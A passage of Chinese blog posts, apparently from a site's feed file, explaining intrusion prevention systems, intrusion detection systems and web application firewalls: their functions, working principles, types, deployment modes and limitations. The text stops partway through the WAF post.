title="二、入侵防御系统的主要功能"></a>二、入侵防御系统的主要功能</h2><ol><li><strong>实时监测和防御</strong>：IPS能够实时监测网络流量和系统活动，一旦发现异常或恶意行为，能够立即启动防御机制，阻断恶意流量，防止攻击扩散。</li><li><strong>网络入侵防护</strong>：IPS能够提供针对多种协议和层面的防护，包括网络层、应用层和系统层，全面防御各种攻击，如缓冲区溢出攻击、木马、蠕虫等。实时、主动拦截黑客攻击、蠕虫、网络病毒、后门木马、Dos等恶意流量，保护企业信息系统和网络架构免受侵害，防止操作系统和应用程序损坏或宕机。</li><li><strong>深度检测和分析</strong>：IPS具备深度包检测（DPI）技术，能够对数据包进行深入分析，识别隐藏在其中的恶意代码、恶意命令或恶意流量模式等。</li><li><strong>威胁情报整合</strong>：IPS能够整合威胁情报数据，了解最新的攻击手段、恶意软件、漏洞利用等信息，从而能够及时更新检测规则和防御策略。</li><li><strong>自定义防护策略</strong>：用户可以根据自己的需求，通过自定义特征码进行防护，使IPS更加适应特定环境下的安全需求。</li><li><strong>Web安全</strong>：基于互联网Web站点的挂马检测结果，结合URL信誉评价技术，保护用户在访问被植入木马等恶意代码的网站时不受侵害，及时、有效地第一时间拦截Web威胁。</li><li><strong>流量控制和优化</strong>：阻断一切非授权用户流量，管理合法网络资源的利用，有效保证关键应用全天候畅通无阻，通过保护关键应用带宽来不断提升企业IT产出率和收益率。</li><li><strong>上网行为监控</strong>：全面监测和管理IM即时通讯、P2P下载、网络游戏、在线视频，以及在线炒股等网络行为，协助企业辨识和限制非授权网络流量，更好地执行企业的安全策略。</li></ol><h2 id="三、入侵防御系统的工作原理"><a href="#三、入侵防御系统的工作原理" class="headerlink" title="三、入侵防御系统的工作原理"></a>三、入侵防御系统的工作原理</h2><p>入侵防御系统（IPS）的工作原理主要基于实时检测和拦截网络流量中的恶意攻击和威胁。IPS通过直接嵌入到网络流量中，对网络流量进行实时检查，对异常活动或可疑内容进行检查后，再通过其他端口将信息传送到内部系统中。如果出现问题的数据包以及其他来自同一源头的后续数据包，都能在IPS设备中预先被过滤掉，这样就可以阻止恶意攻击和威胁进入网络。IPS还可以提供主动保护，针对被明确判断为攻击行为、会对网络、数据造成危害的恶意行为提前进行检测和防御，降低或是减免使用者对异常状况的处理资源开销。</p><p>入侵防御系统的工作原理主要基于以下几个关键技术：</p><ol><li>流量分析：IPS能够实时监控网络流量，并对流量中的数据包进行分类、标记和检测。通过分析流量的协议、端口、流向等信息，以及数据包的载荷内容，IPS能够识别出异常流量和潜在的攻击行为。</li><li>威胁情报：IPS通过收集和分析威胁情报数据，了解最新的攻击手段、恶意软件、漏洞利用等信息，从而能够及时更新检测规则和防御策略。威胁情报可以来自于网络威胁情报平台、安全社区、安全研究机构等。</li><li>深度包检测（DPI）：DPI技术可以对数据包进行深度内容检测，识别出数据包中的各种应用层协议和内容特征。通过DPI技术，IPS能够检测出隐藏在数据包中的恶意代码、恶意命令或恶意流量模式等。</li><li>行为分析：IPS通过分析网络流量中数据包的行为模式，能够识别出异常行为和潜在的攻击行为。例如，IPS可以检测出未经授权的网络扫描、恶意扫描等行为，并采取相应的防御措施。</li><li>防御规则：IPS通过预设的防御规则，能够根据不同的攻击类型和场景，采取不同的防御措施。例如，对于已知的攻击手段，IPS可以采取过滤、阻断、隔离等措施；对于未知的攻击手段，IPS可以采取动态防御、沙箱隔离等措施。</li></ol><p>入侵防御系统通过实时检测、分析网络流量和行为，以及采用威胁情报、深度包检测、行为分析和防御规则等技术手段，实现对网络安全的主动防护和实时防御。</p><h2 id="四、入侵防御系统的分类"><a href="#四、入侵防御系统的分类" class="headerlink" title="四、入侵防御系统的分类"></a>四、入侵防御系统的分类</h2><p>入侵防御系统（IPS）有多种分类方式，以下是常见的几种分类：</p><ol><li>基于部署方式的分类：<br>● 串联部署：IPS串联部署在网络中，能够实时检测并阻断攻击流量，对正常的网络流量不产生影响。<br>● 并联部署：IPS并联部署不会对网络流量产生影响，不会造成数据延迟、丢包等问题。</li><li>基于应用场景的分类：<br>● 网络入侵防御系统（NIPS）：普遍安装在需要保护的网段中，对网段中传输的各种数据包进行实时监视，并对这些数据包进行分析和检测。如果发现入侵行为或可疑事件，入侵防御系统就会发出警报甚至切断网络连接。<br>● 主机入侵防御系统（HIPS）：通过在主机/服务器上安装软件代理程序，防止网络攻击入侵操作系统及应用程序，保护服务器的安全弱点不被不法分子所利用。</li><li>基于防护对象的分类：<br>● 应用入侵防御系统（AIPS）：专门针对应用层进行防护的入侵防御系统。<br>● 数据库入侵防御系统（DBIPS）：专门针对数据库层进行防护的入侵防御系统。</li><li>基于技术原理的分类：<br>● 基于特征的入侵防御系统：通过匹配攻击特征来检测和防御攻击。<br>● 基于行为的入侵防御系统：通过分析网络流量和行为来检测和防御攻击。</li><li>基于安全策略的分类：<br>● 主动防御系统：主动防御系统能够预防、检测并快速响应各种攻击，它通常包括防火墙、入侵检测系统、漏洞扫描器和其他安全组件。<br>● 被动防御系统：被动防御系统主要用于监视和记录网络流量和活动，它通常包括网络监控工具、日志分析器和审计工具等。</li></ol><p>以上分类方式并不是互斥的，有些IPS产品可能同时具备多种分类的特点。在实际应用中，需要根据具体需求选择适合的IPS产品。</p><h2 id="五、入侵防御与防火墙的区别"><a href="#五、入侵防御与防火墙的区别" class="headerlink" title="五、入侵防御与防火墙的区别"></a>五、入侵防御与防火墙的区别</h2><p>入侵防御与防火墙是两种不同的网络安全技术，它们在保护网络安全方面各有侧重。<br>防火墙主要是通过对网络流量进行过滤和阻止，来保护网络免受未经授权的访问和攻击。它是一种被动的防御方式，根据预设的规则对进出网络的数据包进行控制，只允许符合规则的数据包通过。防火墙可以阻止大多数已知的攻击，但对于一些新的、未知的攻击手段，防火墙可能无法进行有效防御。</p><p>入侵防御则是一种更深入的防护方式，它通过对网络流量进行实时监控和分析，发现和阻止潜在的网络攻击行为。与防火墙相比，入侵防御具有更强的主动性和防御能力。它不仅可以检测和防御已知的攻击手段，对于一些未知的攻击，入侵防御系统也可以通过行为分析、深度包检测等技术手段进行检测和防御。此外，入侵防御系统还可以提供实时的检测和响应功能，一旦发现异常流量或攻击行为，可以立即采取相应的防御措施，如隔离、过滤等，从而降低网络受到攻击的风险。</p><p>综上所述，防火墙主要是对网络流量进行过滤和阻止，以防止未经授权的访问和攻击；而入侵防御则通过对网络流量进行实时监控和分析，发现和阻止潜在的网络攻击行为，提供更深入的防护。在实际应用中，可以将防火墙和入侵防御系统结合使用，以实现对网络安全的全面保护。</p><h2 id="六、入侵防御系统的优势和局限性"><a href="#六、入侵防御系统的优势和局限性" class="headerlink" title="六、入侵防御系统的优势和局限性"></a>六、入侵防御系统的优势和局限性</h2><p>入侵防御系统（IPS）的优势主要包括：</p><ol><li>实时阻断攻击：设备采用直路方式部署在网络中，能够在检测到入侵时，实时对入侵活动和攻击性网络流量进行拦截，将对网络的入侵降到最低。</li><li>深层防护：新型的攻击都隐藏在TCP/IP协议的应用层里，入侵防御能检测报文应用层的内容，还可以对网络数据流重组进行协议分析和检测，并根据攻击类型、策略等确定应该被拦截的流量。</li><li>全方位防护：入侵防御可以提供针对蠕虫、病毒、木马、僵尸网络、间谍软件、广告软件、CGI（Common Gateway Interface）攻击、跨站脚本攻击、注入攻击、目录遍历、信息泄露、远程文件包含攻击、溢出攻击、代码执行、拒绝服务、扫描工具、后门等攻击的防护措施，全方位防御各种攻击，保护网络安全。</li><li>内外兼防：入侵防御不但可以防止来自于企业外部的攻击，还可以防止发自于企业内部的攻击。系统对经过的流量都可以进行检测，既可以对服务器进行防护，也可以对客户端进行防护。</li><li>可扩展性：IPS可以提供可扩展的安全性，随着网络流量的增长，IPS可以相应地扩展其能力，以满足不断增长的安全需求。</li></ol><p>然而，入侵防御系统也存在一些局限性：</p><ol><li>误报和漏报：IPS可能会误报或漏报某些正常流量或攻击流量，这可能导致正常业务流量被拦截或攻击流量被漏过。</li><li>处理能力：IPS需要处理大量的网络流量，因此需要高性能的处理能力来确保实时检测和拦截攻击。</li><li>部署复杂性：IPS的部署相对复杂，需要正确配置以确保其正常工作并发挥最佳效果。</li><li>无法防御未知威胁：IPS主要依赖于已知的威胁特征来检测和防御攻击，对于未知威胁的防御能力有限。</li></ol><p>虽然入侵防御系统存在一些局限性，但在提供实时保护和深度防护方面具有显著优势。</p><h2 id="七、入侵防御系统的使用方式"><a href="#七、入侵防御系统的使用方式" class="headerlink" title="七、入侵防御系统的使用方式"></a>七、入侵防御系统的使用方式</h2><p>入侵防御系统（IPS）通常通过串联部署在具有重要业务系统或内部网络安全性、保密性较高的网络出口处。</p><h2 id="八、入侵防御系统与其他安全设备的集成"><a href="#八、入侵防御系统与其他安全设备的集成" class="headerlink" title="八、入侵防御系统与其他安全设备的集成"></a>八、入侵防御系统与其他安全设备的集成</h2><p>入侵防御系统通过高效的集成引擎，实现流量分析、异常或攻击行为的告警及阻断、2～7层安全防护控制等功能，并可以可视化展示用户行为和网络健康状况。与入侵检测系统（IDS）相比，IPS不仅能检测入侵的发生，更能通过一定的响应方式，实时终止入侵行为的发生和发展，实时保护信息系统不受实质性的攻击。</p><p>此外，IPS还可以提供DoS/DDoS检测及预防机制，辨别合法数据包与DoS/DDoS攻击数据包，保证企业在遭受攻击时也能使用网络服务。</p><p>入侵防御系统（IPS）可以与其他多种安全设备集成，以提高整个网络的安全性。以下是一些常见的集成方式：</p><ol><li>与防火墙集成：防火墙是网络安全的基础设施，可以控制网络流量的进出。IPS可以与防火墙集成，利用防火墙的过滤功能，将恶意流量或攻击源阻断在外，从而降低网络受到攻击的风险。</li><li>与反病毒软件集成：反病毒软件可以对网络流量和文件进行病毒扫描和清除。IPS可以与反病毒软件集成，在检测到恶意流量或攻击时，及时清除其中的病毒，保护网络免受病毒的侵害。</li><li>与漏洞扫描器集成：漏洞扫描器可以对网络中的主机和设备进行漏洞扫描和风险评估。IPS可以与漏洞扫描器集成，在检测到漏洞或潜在的攻击时，及时提醒或修复漏洞，提高网络的安全性。</li><li>与日志分析工具集成：日志分析工具可以对网络设备、服务器和应用系统的日志进行分析和处理。IPS可以与日志分析工具集成，将检测到的异常行为和攻击记录到日志中，方便后续的分析和处理。</li><li>与安全事件管理（SIEM）系统集成：SIEM系统可以对各种安全设备和系统的日志进行收集、整合和分析。IPS可以与SIEM系统集成，将检测到的安全事件上报给SIEM系统，实现统一的安全事件管理和响应。</li></ol><p>总的来说，入侵防御系统是一种能够防御防火墙所不能防御的深层入侵威胁的在线部署安全产品，是对防病毒软件和防火墙的补充。在实际应用中，可以根据具体需求和网络环境选择适合的集成方式，以提高整个网络的安全性。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识入侵检测系统</title>
      <link href="/posts/e5ea6795/"/>
      <url>/posts/e5ea6795/</url>
      
        <content type="html"><![CDATA[<p>随着计算机网络技术的快速发展和网络攻击的不断增多，单纯的防火墙策略已经无法满足对安全高度敏感的部门的需要，网络的防卫必须采用一种纵深的、多样的手段。因此，入侵检测系统作为新一代安全保障技术，成为了传统安全防护措施的必要、有效的补充。<a href="http://xiejava.ishareread.com/posts/48309864/" target="_blank" rel="noopener">《安全防御之入侵检测与防范技术》</a>介绍了入侵检测技术，今天让我们从入侵检测系统的工作原理、主要功能、主要类型及与入侵防御系统的关系与区别等方面认识入侵检测系统。</p><h2 id="一、什么是入侵检测系统"><a href="#一、什么是入侵检测系统" class="headerlink" title="一、什么是入侵检测系统"></a>一、什么是入侵检测系统</h2><p>入侵检测系统（IDS，Intrusion Detection Systems）是一种网络安全技术，它主动保护自己免受攻击。IDS可以被视为防火墙的合理补充，帮助系统对付网络攻击，扩展了系统管理员的安全管理能力（包括安全审计、监视、攻击识别和响应），提高了网络安全基础结构的完整性。入侵检测即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是否有违反安全策略的行为或者是否存在入侵行为。</p><p>如果将防火墙比喻为一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。在本质上，入侵检测系统是一个典型的“窥探设备”。它并不会影响网络性能，但能对网络进行监测，从而提供对内部攻击、外部攻击和误操作的实时保护。</p><h2 id="二、入侵检测系统的工作原理"><a href="#二、入侵检测系统的工作原理" class="headerlink" title="二、入侵检测系统的工作原理"></a>二、入侵检测系统的工作原理</h2><p>入侵检测系统（IDS）实时监控网络活动的过程可以概括为以下几个步骤：</p><ol><li>数据采集：IDS首先通过部署在网络中的传感器或代理来收集网络流量数据。这些数据可以包括网络数据包、会话信息、系统日志等。IDS将这些数据收集到中央分析器或分布式处理节点进行处理。</li><li>数据预处理：在数据进入IDS之前，可能需要进行一些预处理操作，如数据清洗、格式转换、归一化等。这些操作有助于减少数据噪声和干扰，提高IDS的检测准确性。</li><li>入侵检测：IDS使用各种检测算法和规则来分析收集到的网络数据。这些算法和规则可以基于异常检测、误用检测或混合检测等原理。异常检测通过分析网络活动的统计特性，识别与正常行为模式偏离的活动；误用检测则通过匹配已知的攻击模式或签名来识别恶意行为。IDS将实时分析网络数据，并与预设的规则或模式进行比对，以判断是否存在入侵行为。</li><li>实时报警和响应：一旦IDS检测到潜在的入侵行为，它会立即触发报警机制，将相关信息发送给管理员或安全运营中心（SOC）。报警信息可以包括入侵类型、攻击源、目标系统等信息。管理员可以根据报警信息采取相应的响应措施，如隔离受影响的系统、收集证据、通知相关部门等。</li></ol><p>为了实现实时监控，IDS通常采用实时处理引擎和高性能的数据分析技术，以应对高速网络流量和大量数据的挑战。此外，IDS还可以与防火墙、安全事件管理（SIEM）等其他安全组件集成，以提供更全面的安全防护和响应能力。</p><h2 id="三、入侵检测系统的主要功能"><a href="#三、入侵检测系统的主要功能" class="headerlink" title="三、入侵检测系统的主要功能"></a>三、入侵检测系统的主要功能</h2><p>入侵检测系统（IDS）能够提供安全审计、监视、攻击识别和反攻击等多项功能，对内部攻击、外部攻击和误操作进行实时监控，在网络安全技术中起到了不可替代的作用。入侵检测系统（IDS）的主要功能包括：</p><ol><li>监控和分析系统网络的数据流量：IDS能够实时地监控网络中的数据流量，包括网络数据包、会话信息等，以发现潜在的攻击和异常行为。</li><li>检测潜在的攻击和异常行为：IDS使用各种检测算法和规则来分析网络数据，以发现与正常行为模式偏离的活动或已知的攻击模式，从而判断是否存在入侵行为。</li><li>提供事件记录流的信息源：IDS能够记录网络中的活动，并生成详细的事件日志，这些日志可以作为后续安全审计和事件响应的重要信息源。</li><li>发现入侵迹象的分析引擎：IDS内置了强大的分析引擎，能够对网络数据进行深度分析，发现隐藏的入侵迹象和攻击行为。</li><li>基于分析引擎的结果产生反应的响应部件：当IDS检测到入侵行为时，它可以触发响应机制，采取相应的措施来阻止攻击或减轻其影响，如隔离受影响的系统、通知管理员等。</li></ol><p>IDS的目标是检测和防止对网络和系统的非法访问和恶意攻击，保护信息资源的机密性、完整性和可用性。IDS通常被部署在网络的关键位置，如网络入口、服务器区等，以实现对网络活动的全面监控和检测。</p><p>入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。绝大多数IDS系统都是被动的。也就是说，在攻击实际发生之前，它们往往无法预先发出警报。如需要主动响应，需与防火墙联动，调用其他程序处理。</p><h2 id="四、入侵检测系统的主要类型"><a href="#四、入侵检测系统的主要类型" class="headerlink" title="四、入侵检测系统的主要类型"></a>四、入侵检测系统的主要类型</h2><h3 id="1、-基于主机的入侵检测系统（HIDS）"><a href="#1、-基于主机的入侵检测系统（HIDS）" class="headerlink" title="1、 基于主机的入侵检测系统（HIDS）"></a>1、 基于主机的入侵检测系统（HIDS）</h3><p>基于主机的入侵检测系统是早期的入侵检测系统结构，通常是软件型的，直接安装在需要保护的主机上。其检测的目标主要是主机系统和系统本地用户，检测原理是根据主机的审计数据和系统日志发现可疑事件。</p><p>这种检测方式的优点主要有：信息更详细、误报率要低、部署灵活。这种方式的缺点主要有：会降低应用系统的性能；依赖于服务器原有的日志与监视能力；代价较大；不能对网络进行监测；需安装多个针对不同系统的检测系统。</p><h3 id="2、基于网络的入侵检测系统（NIDS）"><a href="#2、基于网络的入侵检测系统（NIDS）" class="headerlink" title="2、基于网络的入侵检测系统（NIDS）"></a>2、基于网络的入侵检测系统（NIDS）</h3><p>基于网络的入侵检测方式是目前一种比较主流的监测方式，这类检测系统需要有一台专门的检测设备。检测设备放置在比较重要的网段内，不停地监视网段中的各种数据包，而不再是只监测单一主机。它对所监测的网络上每一个数据包或可疑的数据包进行特征分析，如果数据包与产品内置的某些规则吻合，入侵检测系统就会发出警报，甚至直接切断网络连接。目前，大部分入侵检测产品是基于网络的。</p><p>这种检测技术的优点主要有：能够检测那些来自网络的攻击和超过授权的非法访问；不需要改变服务器等主机的配置，也不会影响主机性能；风险低；配置简单。其缺点主要是：成本高、检测范围受局限；大量计算，影响系统性能；大量分析数据流，影响系统性能；对加密的会话过程处理较难；网络流速高时可能会丢失许多封包，容易让入侵者有机可乘；无法检测加密的封包；对于直接对主机的入侵无法检测出。</p><h2 id="五、入侵检测系统的使用方式"><a href="#五、入侵检测系统的使用方式" class="headerlink" title="五、入侵检测系统的使用方式"></a>五、入侵检测系统的使用方式</h2><p>作为防火墙后的第二道防线，适于以旁路接入方式部署在具有重要业务系统或内部网络安全性、保密性较高的网络出口处。需要注意的是，IDS只能提供有限的防御能力，它主要用于检测和报警，而不是直接阻止攻击。因此，在使用IDS时，应与其他安全设备（如防火墙、入侵防御系统等）结合使用，形成多层次、纵深的安全防护体系。同时，定期更新IDS的规则和参数，以适应不断变化的网络威胁和攻击手法也是非常重要的。</p><h2 id="六、入侵检测系统的局限性"><a href="#六、入侵检测系统的局限性" class="headerlink" title="六、入侵检测系统的局限性"></a>六、入侵检测系统的局限性</h2><p>入侵检测系统（IDS）在网络安全领域扮演着重要角色，但也存在一些局限性：</p><ol><li>误报和漏报：IDS在检测网络流量和异常行为时，可能会产生误报（将正常行为误判为攻击）或漏报（未能检测到实际的攻击行为）。这可能会给管理员带来不必要的困扰，或者导致真正的攻击被忽视。</li><li>无法弥补安全防御系统中的安全缺陷和漏洞：IDS作为一种被动防御手段，只能检测和报警，而无法直接修复或弥补网络系统中的安全缺陷和漏洞。因此，IDS需要与其他安全设备和措施（如防火墙、漏洞扫描器等）结合使用，形成多层次的安全防护体系。</li><li>对加密流量的限制：由于加密技术的广泛应用，许多网络流量都是加密传输的。IDS在检测这些加密流量时可能面临困难，因为无法直接获取和分析其中的内容。这可能会影响IDS的检测准确性和效率。</li><li>实时性挑战：随着网络速度的不断提升和数据量的急剧增加，IDS需要处理大量的网络流量和数据。这可能对IDS的实时性能提出挑战，导致检测延迟或漏报等问题。</li><li>依赖特征库和更新：许多IDS采用基于特征的检测方法，依赖于已知的攻击特征和签名数据库。然而，新的攻击手法和变种不断涌现，如果IDS的特征库未能及时更新，就可能导致无法检测到新的攻击。</li><li>管理和配置复杂性：IDS的配置和管理可能相对复杂，需要具备一定的专业知识和技能。不当的配置和管理可能导致IDS的性能下降或误报率增加。</li></ol><p>尽管IDS在网络安全领域具有重要价值，但其局限性也需要充分认识和应对。通过与其他安全设备和措施结合使用、定期更新特征库、优化配置和管理等方式，可以最大限度地发挥IDS的作用，提高网络安全的整体防护水平。</p><h2 id="七、入侵检测系统弥补了防火墙的哪些不足"><a href="#七、入侵检测系统弥补了防火墙的哪些不足" class="headerlink" title="七、入侵检测系统弥补了防火墙的哪些不足"></a>七、入侵检测系统弥补了防火墙的哪些不足</h2><p>入侵检测系统（IDS）主要弥补了防火墙在以下方面的不足：</p><ol><li>主动检测入侵攻击：防火墙作为访问控制设备，无法主动检测或拦截嵌入到普通流量中的恶意攻击代码，如针对Web服务的注入攻击等。IDS能够主动对网络流量进行深度分析，检测并发现这些潜在的攻击行为。</li><li>内部网络保护：防火墙通常部署在网络边界处，难以有效监控内部网络中的攻击行为。IDS可以部署在内部网络中，对内部流量进行监控和分析，发现内部网络中的异常行为和潜在威胁。</li><li>实时防御能力：IDS能够在入侵攻击对网络系统造成危害前，及时检测到入侵攻击的发生，并进行报警和动态防御。通过与防火墙联动等方式，IDS可以实时地阻止攻击行为，提高网络的安全性。</li><li>事后取证分析：被入侵攻击后，IDS可以提供详细的攻击信息，包括攻击来源、攻击类型、攻击目标等，便于取证分析。这些信息有助于管理员了解攻击的全貌，为后续的安全防护提供有力支持。</li></ol><p>IDS通过对网络流量进行深度分析，主动检测并防御网络攻击，有效弥补了防火墙在主动检测、内部网络保护、实时防御和事后取证分析等方面的不足，提高了网络的整体安全性。</p><h2 id="八、入侵检测系统（IDS）与入侵防御系统（IPS）的区别与关系"><a href="#八、入侵检测系统（IDS）与入侵防御系统（IPS）的区别与关系" class="headerlink" title="八、入侵检测系统（IDS）与入侵防御系统（IPS）的区别与关系"></a>八、入侵检测系统（IDS）与入侵防御系统（IPS）的区别与关系</h2><p>入侵检测系统（IDS）和入侵防御系统（IPS）都是网络安全领域的重要组件，它们之间存在一定的区别与关系。</p><h3 id="1、IDS与IPS的区别"><a href="#1、IDS与IPS的区别" class="headerlink" title="1、IDS与IPS的区别"></a>1、IDS与IPS的区别</h3><ol><li>工作原理：IDS是一种被动的监视设备，它主要通过分析网络流量来检测潜在的攻击和异常行为，并在发现威胁时发出警报。而IPS则是一种主动的防护设备，它不仅能够检测攻击，还能够根据预设的安全策略对恶意流量进行丢弃、阻断或重置，从而实时地中止入侵行为。</li><li>部署方式：IDS通常作为旁路监听设备部署在网络中，不需要跨接在任何链路上，也不会影响网络性能。而IPS则需要跨接在网络链路上，承担数据转发的功能，因此可能对网络性能产生一定的影响。</li><li>检测与处理能力：IDS主要采用基于签名、基于异常和基于安全策略的检测技术，对网络流量进行深度分析，识别出各种已知和未知的攻击行为。而IPS则主要使用基于签名的检测技术，对已知威胁的特征进行匹配，并进行相应的响应处理。此外，IPS还可以执行一些操作来阻止攻击，而IDS则主要侧重于检测和报警。</li></ol><h3 id="2、IDS与IPS的关系"><a href="#2、IDS与IPS的关系" class="headerlink" title="2、IDS与IPS的关系"></a>2、IDS与IPS的关系</h3><p>IDS和IPS在网络安全防护中相互配合，共同提升网络的安全性。IDS通过对全网信息的分析，了解信息系统的安全状况，进而指导信息系统安全建设目标以及安全策略的确立和调整。而IPS则负责在发现攻击时实时地中止入侵行为，保护网络免受进一步的破坏。因此，IDS和IPS可以相互补充，形成更为完善的网络安全防护体系。</p><p>总的来说，IDS的目标是检测和防止对网络和系统的非法访问和恶意攻击，保护信息资源的机密性、完整性和可用性。IDS通常被部署在网络的关键位置，如网络入口、服务器区等，以实现对网络活动的全面监控和检测。同时，IDS还可以与其他安全设备如防火墙、安全事件管理（SIEM）等进行联动，形成更为完善的网络安全防护体系。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识WEB应用防火墙</title>
      <link href="/posts/30d0931f/"/>
      <url>/posts/30d0931f/</url>
      
        <content type="html"><![CDATA[<p>随着B/S架构的广泛应用，Web应用的功能越来越丰富，蕴含着越来越有价值的信息，应用程序漏洞被恶意利用的可能性越来越大，因此成为了黑客主要的攻击目标。传统防火墙无法解析HTTP应用层的细节，对规则的过滤过于死板，无法为Web应用提供足够的防护。为了解决上述问题，WAF应运而生。它通过执行一系列针对HTTP、HTTPS的安全策略，专门对Web应用提供保护。</p><h2 id="一、什么是WEB应用防火墙"><a href="#一、什么是WEB应用防火墙" class="headerlink" title="一、什么是WEB应用防火墙"></a>一、什么是WEB应用防火墙</h2><p>Web应用防火墙（Web Application Firewall，简称WAF）是一种网络安全产品，主要用于增强对Web应用程序的控制和保护。是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一种设备。与传统防火墙不同，WAF工作在应用层，因此对Web应用防护具有先天的技术优势。基于对Web应用业务和逻辑的深刻理解，WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。</p><h2 id="二、WEB应用防火墙的主要功能"><a href="#二、WEB应用防火墙的主要功能" class="headerlink" title="二、WEB应用防火墙的主要功能"></a>二、WEB应用防火墙的主要功能</h2><p>Web应用防火墙的主要功能：</p><ol><li>防止常见的Web漏洞：WAF可以防止常见的Web漏洞，如SQL注入、跨站脚本攻击（XSS）、文件包含漏洞等。通过检查HTTP请求和响应，WAF能够识别并阻止针对这些漏洞的攻击。</li><li>防止恶意输入：WAF能够检测并过滤掉恶意输入，从而防止应用程序受到攻击。它还可以对用户输入进行验证和过滤，以确保只有合法的输入被接受。</li><li>防止会话劫持：WAF可以防止会话劫持攻击，通过验证HTTP请求中的会话令牌来确保请求来自合法的用户。</li><li>防止DDoS攻击：WAF可以防止分布式拒绝服务（DDoS）攻击，这种攻击通过大量合法的请求来拥塞Web服务器，从而使其无法处理正常的请求。WAF可以通过限制来自同一IP地址的请求数量或识别异常流量模式来阻止DDoS攻击。</li><li>自定义规则：WAF通常提供自定义规则的功能，允许管理员根据自己的需求配置防火墙的行为。这使得管理员可以更加精确地控制Web应用程序的访问和行为。</li><li>日志和监控：WAF提供详细的日志记录功能，记录所有通过防火墙的请求和响应。管理员可以监控这些日志以检测异常行为或攻击，并采取适当的措施。</li><li>与其他安全产品集成：WAF可以与其他网络安全产品集成，如入侵检测系统（IDS/IPS）、反病毒软件等。这种集成可以提供更全面的安全防护，应对各种不同的威胁。</li></ol><h2 id="三、WEB应用防火墙的产品特点"><a href="#三、WEB应用防火墙的产品特点" class="headerlink" title="三、WEB应用防火墙的产品特点"></a>三、WEB应用防火墙的产品特点</h2><p>WAF（Web应用防火墙）产品的特点主要包括以下几个方面:</p><ol><li>异常检测和防御：WAF会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。</li><li>输入验证：WAF可以增强输入验证，有效防止网页篡改、信息泄露、木马植入等恶意网络入侵行为，减小Web服务器被攻击的可能性。</li><li>安全规则库：WAF建立安全规则库，严格的控制输入验证，以安全规则来判断应用数据是否异常，如有异常直接阻断。以此来有效的防止网页篡改的可能性。</li><li>用户行为分析：WAF运用技术判断用户是否是第一次请求访问的，同时将请求重定向到默认的登陆页面并且记录该事件。以此来检测识别用户的操作是否存在异常，并且对达到阈值，触发规则的访问进行处理。</li><li>防御机制：WAF防御机制可以用来隐藏表单域保护，响应监控信息泄露或者被攻击时的提示，也可以规避入侵，爬虫等技术。</li><li>部署方式多样：WAF可以以硬件设备、软件产品、云服务等不同形式部署在网络中，以满足不同场景和需求。</li><li>高可用性和高性能：WAF可以提供高性能和低延迟，适用于高流量的Web应用程序。同时，它可以提供全球分布的节点，从而提高Web应用程序的可用性和性能。</li><li>弹性扩展和自动升级：云WAF通常具有弹性扩展、自动升级等优点，适用于高可用性和高性能的Web应用程序。</li><li>高安全性：WAF可以作为安全保障措施对各类网站站点进行有效的防护。</li></ol><h2 id="四、WEB应用防火墙的部署方式"><a href="#四、WEB应用防火墙的部署方式" class="headerlink" title="四、WEB应用防火墙的部署方式"></a>四、WEB应用防火墙的部署方式</h2><p>与IPS设备部署方式类似，可以串联部署在web服务器等关键设备的网络出口处。主要有3种部署模式。</p><ol><li>透明网桥模式</li></ol><p>透明网桥模式指在两台运行的设备中间插入WEB应用防火墙，但是对流量并不产生任何影响。在透明网桥模式下，Web应用防火墙阻断Wb应用层攻击，而让其他的流量通过。透明网桥模式是部署最为简便的方式。透明网桥模式是透明的，所以不会干预任何网络中的设备，如图所示。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240115/web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E9%80%8F%E6%98%8E%E7%BD%91%E6%A1%A5%E6%A8%A1%E5%BC%8F%E9%83%A8%E7%BD%B2.png" alt="WEB应用防火墙透明网桥模式部署"></p><center>WEB应用防火墙透明网桥模式部署</center><ol start="2"><li>单机模式</li></ol><p>单机模式下，Web应用防火墙只要串入Web服务器的前端即可进行防护，同时并不影响Web服务器的其他应用，如图所示。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240115/web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E5%8D%95%E6%9C%BA%E6%A8%A1%E5%BC%8F%E9%83%A8%E7%BD%B2.png" alt="WEB应用防火墙单机模式部署"></p><center>WEB应用防火墙单机模式部署</center><ol 